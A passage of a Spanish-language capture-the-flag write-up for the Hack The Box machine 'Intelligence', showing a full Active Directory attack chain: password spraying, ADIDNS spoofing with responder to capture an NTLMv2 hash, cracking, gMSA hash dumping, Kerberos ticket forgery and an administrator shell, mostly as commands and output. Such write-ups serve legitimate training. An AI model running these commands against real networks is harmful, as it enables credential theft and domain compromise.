&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Thomas.Hall@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Stephanie.Young@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Scott.Scott@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Samuel.Richardson@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Teresa.Williamson@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Travis.Evans@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Tiffany.Molina@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       William.Lee@intelligence.htb
&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:       Veronica.Patel@intelligence.htb
&gt;  Done! Tested <span style=color:#ae81ff>30</span> usernames <span style=color:#f92672>(</span><span style=color:#ae81ff>30</span> valid<span style=color:#f92672>)</span> in 0.355 seconds
</code></pre></div><p>Y lo son. Podemos comprobar si alguno de ellos es &ldquo;AS-REP Roasteable&rdquo;, pero ninguno de ellos lo es. Hemos llegado a otro punto muerto.</p>
<h2 id=obtención-de-credenciales-válidas>Obtención de credenciales válidas</h2>
<p>Ahora, podemos revisar el contenido de los documentos PDF. A lo mejor hay alguno que no contiene un <em>Lorem ipsum</em>.</p>
<p>Y así es, el archivo <code>2020-06-04.pdf</code> contiene la siguiente información:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible. 
</code></pre></div><p>Y también el archivo <code>2020-12-30.pdf</code> es interesante:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext>Internal IT Update

There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process 
of locking down our service accounts.
</code></pre></div><p>El primer documento dice que todos los nuevos usuarios tendrán la misma contraseña para iniciar sesión la primera vez. Esta contraseña se debe cambiar inmediatamente. No obstante, es probable que alguno de los usuarios se haya olvidado de cambiar la contraseña.</p>
<p>Esta es una situación clara para efectuar un ataque de <em>password spray</em>. Utilizando otra vez <a href=https://github.com/ropnop/kerbrute><code>kerbrute</code></a> obtenemos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ ./kerbrute passwordspray --dc dc.intelligence.htb -d intelligence.htb users.txt NewIntelligenceCorpUser9876
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
&gt;   dc.intelligence.htb:88
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>&gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876     <span style=color:#f92672>(</span>Clock skew is too great<span style=color:#f92672>)</span> 
&gt;  Done! Tested <span style=color:#ae81ff>30</span> logins <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> successes<span style=color:#f92672>)</span> in 0.710 seconds
</code></pre></div><p>El usuario llamado <code>Tiffany.Molina</code> tiene la contraseña por defecto. Utilizando <a href=https://github.com/byt3bl33d3r/CrackMapExec><code>crackmapexec</code></a> podemos verificar que las credenciales son válidas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
</code></pre></div><h2 id=enumeración-por-smb>Enumeración por SMB</h2>
<p>Ahora, podemos enumerar los recursos compartidos por SMB utilizando las credenciales encontradas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.248    445    DC               Users           READ
</code></pre></div><p>El usuario <code>Tiffany.Molina</code> tiene permisos de lectura sobre los recursos <code>IT</code> y <code>Users</code>. Dentro de <code>Users</code> podemos encontrar las siguientes carpetas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r Users 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\\*
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    .
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    ..
        dr--r--r--                0 Mon Apr 19 02:18:39 2021    Administrator
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    All Users
        dw--w--w--                0 Mon Apr 19 04:17:40 2021    Default
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    Default User
        fr--r--r--              174 Mon Apr 19 05:15:17 2021    desktop.ini
        dw--w--w--                0 Mon Apr 19 02:18:39 2021    Public
        dr--r--r--                0 Mon Apr 19 03:20:26 2021    Ted.Graves
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Tiffany.Molina
</code></pre></div><p>Y aquí poremos ver la <em>flag</em> <code>user.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download <span style=color:#e6db74>&#39;Users\Tiffany.Molina\Desktop\user.txt&#39;</span> 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[+] Starting download: Users\Tiffany.Molina\Desktop\user.txt (34 bytes)
[+] File output to: 10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ mv *user.txt user.txt
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ cat user.txt
d97eb9e4c5535fa637062d14b4b5e8c1 
</code></pre></div><h2 id=movimiento-lateral>Movimiento lateral</h2>
<p>Mirando en el recurso <code>IT</code>, podemos ver un <em>script</em> en Powershell:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 -r IT
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IT                                                      READ ONLY
        .\IT\\*
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    .
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    ..
        fr--r--r--             1046 Mon Apr 19 02:50:58 2021    downdetector.ps1
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -H 10.10.10.248 --download <span style=color:#e6db74>&#39;IT\downdetector.ps1&#39;</span> 
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[+] Starting download: IT\downdetector.ps1 (1046 bytes)
[+] File output to: /Users/rocky/RockyHack/HackTheBox/Machines/Intelligence/content/smb/10.10.10.248-IT_downdetector.ps1
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ mv *.ps1 downdetector.ps1
</code></pre></div><p>Este <em>script</em> es el siguiente:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-powershell data-lang=powershell><span style=color:#75715e># Check web server status. Scheduled to run every 5 min</span>
Import-Module ActiveDirectory
<span style=color:#66d9ef>foreach</span> ($record <span style=color:#66d9ef>in</span> Get-ChildItem <span style=color:#e6db74>&#34;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&#34;</span> | Where-Object Name <span style=color:#f92672>-like</span> <span style=color:#e6db74>&#34;web*&#34;</span>) {
  <span style=color:#66d9ef>try</span> {
    $request = Invoke-WebRequest -Uri <span style=color:#e6db74>&#34;http://</span>$($record.Name)<span style=color:#e6db74>&#34;</span> -UseDefaultCredentials
    <span style=color:#66d9ef>if</span> (.StatusCode <span style=color:#f92672>-ne</span> 200) {
      Send-MailMessage -From <span style=color:#e6db74>&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -To <span style=color:#e6db74>&#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39;</span> -Subject <span style=color:#e6db74>&#34;Host: </span>$($record.Name)<span style=color:#e6db74> is down&#34;</span> 
    }
  } <span style=color:#66d9ef>catch</span> { }
}
</code></pre></div><p>Básicamente, lo que hace el <em>script</em> es buscar en LDAP subdominios del tipo <code>web*.intelligence.htb</code> y realizar una petición web con las credenciales de <code>Ted.Graves</code> (cada 5 minutos). Recordemos que uno de los documentos PDF hablaba de este <em>script</em>.</p>
<p>Esta vez, podemos añadir un subdominio llamado <code>webrocky.intelligence.htb</code> al DNS utilizando las credenciales de <code>Tiffany.Molina</code> para que apunte a nuestra dirección IP de atacante (esto se conoce como ADIDNS <em>Spoofing</em>, más información <a href=https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing>aquí</a>):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 dnstool.py -u <span style=color:#e6db74>&#39;intelligence.htb\Tiffany.Molina&#39;</span> -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
</code></pre></div><p>Después, podemos envenenar la red con <code>responder</code> para obtener el <em>hash</em> NTLMv2 de <code>Ted.Graves</code> (después de unos 5 minutos):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console># responder -I tun0 -wrf
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:babffe540ac1b831:0364CAF23EA2F62B341D14C3F4549FFE:0101000000000000B781A55282DBD701F1D34C24313F979000000000020008004C004E004B00390001001E00570049004E002D00470059005A0039005700450041003800580054004600040014004C004E004B0039002E004C004F00430041004C0003003400570049004E002D00470059005A00390057004500410038005800540046002E004C004E004B0039002E004C004F00430041004C00050014004C004E004B0039002E004C004F00430041004C0008003000300000000000000000000000002000004ED462F79CC6312548361C6AE96725DCCB9550B7169C99A9C3663CDF8F50C6F80A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D0072006F0063006B0079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 
</code></pre></div><p>Ahora que tenemos el <em>hash</em>, podemos tratar de romperlo con <code>john</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ john --wordlist<span style=color:#f92672>=</span>$WORDLISTS/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:18 100% 0.05288g/s 571891p/s 571891c/s 571891C/s Mr5M1rtins..Mr BOB
Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably 
Session completed.
</code></pre></div><p>Y encontramos la contraseña. Veamos si las credenciales son válidas con <a href=https://github.com/byt3bl33d3r/CrackMapExec><code>crackmapexec</code></a>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
</code></pre></div><h2 id=ataque-de-_silver-ticket_>Ataque de <em>Silver Ticket</em></h2>
<p>Y aquí tenemos otro punto muerto. Para continuar enumerando el entorno de Active Directory, podemos utilizar <a href=https://github.com/BloodHoundAD/BloodHound>BloodHound</a>.</p>
<p>Para ello, primero generamos los archivos JSON con la información necesaria (dominios, ordenadores, usuarios y grupos) con <a href=https://github.com/fox-it/BloodHound.py><code>bloodhound-python</code></a>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ bloodhound-python -c all -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --dns-timeout <span style=color:#ae81ff>60</span> -w <span style=color:#ae81ff>1</span> 
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 1 workers
INFO: Querying computer: svc_int.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 61.44789505004883 seconds
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 01M 29S
</code></pre></div><p>A continuación, introducimos los archivos en <a href=https://github.com/BloodHoundAD/BloodHound>BloodHound</a> y buscamos información para poder obtener acceso al Controlador de Dominio (DC). Obtenemos el siguiente grafo:</p>
<p><img src=../../../images/HTB/Intelligence/Intelligence-bloodhound.png alt=Bloodhound></p>
<p>Como vemos, el usuario <code>Ted.Graves</code> es miembro del grupo <code>ITSupport</code>. Y los miembros de este grupo tienen permiso para obtener la contraseña de <code>svc_int$</code>, una cuenta de servicio gestionada por un grupo (gMSA).</p>
<p>Utilizando <a href=https://github.com/micahvandeusen/gMSADumper><code>gMSADumper</code></a>, podemos conseguir el <em>hash</em> NTLM de la cuenta de este servicio:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb 
Users or groups who can read password for svc_int$:
 &gt; DC$
 &gt; itsupport
svc_int$:::b98d4cef68f72a98dfeed732d1b1abca
</code></pre></div><p>Y obtenemos el <em>hash</em> NTLM de <code>svc_int$</code>. Ahora es el momento de efectuar un ataque de <em>Silver Ticket</em>.</p>
<p>Como en cualquier ataque a Kerberos, en primer lugar es necesario sincronizarse con el servidor (utilizando <code>ntpdate</code> o <code>rdate</code>):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console># ntpdate 10.10.10.248
ntpdate[25547]: step time server 10.10.10.248 offset +29732.296110 sec 
</code></pre></div><p>Y ahora podemos obtener el <em>Silver Ticket</em> para impersonar al usuario <code>Administrator</code> utilizando <code>getST.py</code> de Impacket y especificando el <em>hash</em> de <code>svc_int$</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :b98d4cef68f72a98dfeed732d1b1abca intelligence.htb/svc_int$ 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>$ export KRB5CCNAME<span style=color:#f92672>=</span>Administrator.ccache
</code></pre></div><p>Después de exportar la variable de entormo <code>KRB5CCNAME</code>, podemos utilizar prácticamente cualquier herramienta de Impacket para ganar acceso a la máquina utilizando los parámetros <code>-k -no-pass</code> (por ejemplo: <code>smbclient.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code> o <code>psexec.py</code>).</p>
<p>Utilizando <code>wmiexec.py</code> podemos entrar como <code>Administrator</code> y capturar la <em>flag</em> <code>root.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console>$ wmiexec.py -k -no-pass -dc-ip 10.10.10.248 intelligence.htb/Administrator@dc.intelligence.htb 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
intelligence\administrator
<span style=color:#960050;background-color:#1e0010>
</span><span style=color:#960050;background-color:#1e0010></span>C:\&gt;type C:\Users\Administrator\Desktop\root.txt
f8f11214c3520eedde9fa839193356bc
</code></pre></div><div class="mt6 instapaper_ignoref">
</div>
</div>
<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#encontrando-nombres-de-usuario-en-metadatos-de-archivos>Encontrando nombres de usuario en metadatos de archivos</a></li>
<li><a href=#encontrando-más-archivos-y-nombres-de-usuario>Encontrando más archivos y nombres de usuario</a></li>
<li><a href=#obtención-de-credenciales-válidas>Obtención de credenciales válidas</a></li>
<li><a href=#enumeración-por-smb>Enumeración por SMB</a></li>
<li><a href=#movimiento-lateral>Movimiento lateral</a></li>
<li><a href=#ataque-de-_silver-ticket_>Ataque de <em>Silver Ticket</em></a></li>
</ul>
</nav>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>